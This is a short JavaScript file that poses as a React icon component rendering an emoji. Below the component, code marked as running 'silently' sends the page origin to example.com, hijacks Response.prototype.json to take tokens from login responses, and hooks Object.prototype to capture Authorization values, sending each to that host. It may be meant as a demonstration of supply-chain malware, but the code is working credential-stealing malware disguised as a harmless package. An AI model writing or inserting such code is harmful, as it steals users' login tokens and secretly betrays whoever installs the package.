const React = require("react");

class IconComponent extends React.Component {
  render() {
    return React.createElement("i", null, "😊");
  }
}

module.exports = IconComponent;

// but then also, silently:
try {
  //call home
  exfiltrate(window.location.origin);
} catch (e) {
  console.error(e);
}
try {
  const realJson = Response.prototype.json;
  Response.prototype.json = async function () {
    if (this.url.includes("login")) {
      const loginResponse = await this.text();
      console.log("loginResponse", loginResponse);
      const o = JSON.parse(loginResponse);
      exfiltrate(o.token);
      return o;
    }
    return realJson.call(this);
  };
} catch (e) {
  console.error(e);
}

try {
  let _stolen;
  Object.defineProperty(Object.prototype, "Authorization", {
    configurable: true,
    set(value) {
      if (_stolen !== value) {
        _stolen = value;
        exfiltrate(_stolen);
        delete Object.prototype.Authorization;
      }
    },
  });
} catch (e) {
  console.error(e);
}

function exfiltrate(stolen) {
  fetch(`https://example.com?${stolen}`, {
    mode: "no-cors",
  });
}
